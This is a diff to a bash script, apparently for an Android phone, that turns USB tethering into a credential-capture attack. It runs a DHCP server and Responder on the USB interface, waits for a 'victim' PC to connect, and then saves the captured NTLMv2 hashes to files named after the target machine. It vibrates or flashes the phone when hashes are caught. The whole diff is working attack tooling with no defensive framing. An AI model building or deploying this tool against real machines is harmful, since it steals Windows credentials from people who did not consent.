@@ -3,7 +3,8 @@
 #########################################
 #### Define default global variables ####
 #########################################
-DEPS=(isc-dhcp-server isc-dhcp-common)
+DEPS=(isc-dhcp-server isc-dhcp-common responder)
+RESPONDER_PATH="/usr/share/responder"
 
 ################################
 #### Define shell functions ####
@@ -17,6 +18,7 @@ function print_usage() {
     echo "      -C(required)    The Gateway IP of usb network interface"
     echo "      -D(required)    The IP subnet mask address in octet format"
     echo "      -k              Perform clean up process. Used with -o and -i option only."
+    echo "      -N              Notification method when NTLM is captured: vibrate|flash (default: vibrate)"
     echo ""
     echo "    e.g. usbtethering -o wlan0 -i rndis0 -A 192.168.100.10 -B 192.168.100.15 -C 192.168.100.1 -D 255.255.255.0"
     echo "    e.g. usbtethering -o wlan0 -i rndis0 -k"
@@ -27,7 +29,16 @@ function kill_proc() {
 
     ## Kill the dhcpd process ##
     pkill dhcpd
-    pkill python2
+
+    ## Kill Responder and WAIT for it to fully die before tearing down
+    ## the interface — otherwise its raw socket recvfrom() throws
+    ## "Network is down" once the iface goes away mid-poll.
+    pkill -f Responder.py
+    for i in $(seq 1 10); do
+        pgrep -f Responder.py > /dev/null 2>&1 || break
+        sleep 0.5
+    done
+    pkill -9 -f Responder.py > /dev/null 2>&1
 
     ## Remove dhcpd stuff. ##
     rm -f /var/lib/dhcp/dhcpd.leases
@@ -55,6 +66,29 @@ function kill_proc() {
 
     echo "[+] Done."
     exit 0
+}
+
+function notify_vibrate() {
+    local DURATION_MS=${1:-2000}
+    echo "$DURATION_MS" > /sys/class/leds/vibrator/duration
+    echo 1 > /sys/class/leds/vibrator/activate
+    sleep $((DURATION_MS / 1000))
+}
+
+function notify_flash() {
+    local DURATION_S=${1:-2}
+    echo 50 > /sys/class/leds/led\:torch_0/brightness
+    echo 50 > /sys/class/leds/led\:torch_1/brightness
+    echo 1 > /sys/class/leds/led\:switch_0/brightness
+    sleep $DURATION_S
+    echo 0 > /sys/class/leds/led\:switch_0/brightness
+}
+
+function notify_captured() {
+    case "$NOTIFY_METHOD" in
+        flash) notify_flash ;;
+        vibrate|*) notify_vibrate ;;
+    esac
 }
 
 function dep_check() {
@@ -209,7 +243,7 @@ if [ "$1" = "--help" ]; then
 fi
 
 ## Parse the args first. ##
-while getopts "o:i:c:A:B:C:D:k" OPTS; do
+while getopts "o:i:c:A:B:C:D:N:k" OPTS; do
     case $OPTS in
         o) UPSTREAM_IFACE=$OPTARG;;
         i) USB_IFACE=$OPTARG;;
@@ -218,10 +252,16 @@ while getopts "o:i:c:A:B:C:D:k" OPTS; do
         B) IP_END=$OPTARG;;
         C) IP_GW=$OPTARG;;
         D) IP_SUB_OCTET=$OPTARG;;
+        N) NOTIFY_METHOD=$OPTARG;;
         k) WANT_TO_KILL=1;;
         *) print_usage; exit 1;;
     esac
 done
+
+## Default notification method to vibrate if not specified or invalid ##
+if [ "$NOTIFY_METHOD" != "flash" ]; then
+    NOTIFY_METHOD="vibrate"
+fi
 
 ## Check if user wants to kill process ##
 if [ ! -z $WANT_TO_KILL ]; then
@@ -270,14 +310,15 @@ start_dhcpd
 
 #Responder Part
 echo "[!] Clearing Responder Logs and DB"
-rm /tools/responder/logs/*
-rm /tools/responder/*.db
+rm $RESPONDER_PATH/logs/*
+rm $RESPONDER_PATH/*.db
 echo "[!] Running Responder to capture ntlm"
-python2 /tools/responder/Responder.py -I $USB_IFACE -e $IP_GW -w -d -r -P 1>/dev/null &
+# responder -I $USB_IFACE -e $IP_GW -Pvd 1>/dev/null &
+nohup responder -I $USB_IFACE -e $IP_GW -Pvd > /dev/null 2>&1 &
 
 ## Get target's IP and PC name ##
 ## loop over the lease file to see if target has been given the ip address and internet access. ##
-echo "[!] Assigning address to target" #"timeout: $TIMEOUT"
+echo "[+] WAITING FOR VICTIM ...." #"timeout: $TIMEOUT"
 while true; do
     # echo "[!] Assigning address to target, timeout: $TIMEOUT"
     TARGET_ADDR=$(cat /var/lib/dhcp/dhcpd.leases | grep "^lease" | awk 'NR==1{print $2}');
@@ -294,22 +335,26 @@ done
 
 ## Enter to kill program ##
 echo "[+] BRING IT ON !! LETS ROCK & ROLL !!"
-#echo "[!] And DONT Forget to Hit 'ENTER' button to Kill Me"
-#read
 
 #check until ntlm logs are found
-cd /tools/responder
 echo "[+] Checking NTLM has been captured"
-until [ -f logs/*NTLM*  ]
+until [ -f $RESPONDER_PATH/logs/*NTLM*  ]
 do
      sleep 1
 done
 
 #NTLM has been captured. turn on flash light (AOSP) A10-13 Only
-echo "[!] NTLM has beem captured, shutting down."
-echo 50 > /sys/class/leds/led\:torch_0/brightness
-echo 50 > /sys/class/leds/led\:torch_1/brightness
-echo 1 > /sys/class/leds/led\:switch_0/brightness
+echo "[!] NTLM has been captured, shutting down."
+
+## Backup captured NTLM hashes before teardown ##
+BACKUP_DIR="/root/ntlm_dumps"
+mkdir -p "$BACKUP_DIR"
+TARGET_PC_SAFE=$(echo "$TARGET_PC_NAME" | tr -c '[:alnum:]_-' '_')
+BACKUP_FILE="$BACKUP_DIR/${TARGET_PC_SAFE}-$(date +%Y%m%d-%H%M%S).ntlmv2"
+cat $RESPONDER_PATH/logs/*NTLM* > "$BACKUP_FILE" 2>/dev/null
+echo "[+] NTLM hashes backed up to $BACKUP_FILE"
+
+notify_captured
 
 ## Shutdown and Job Done! ##
 kill_proc
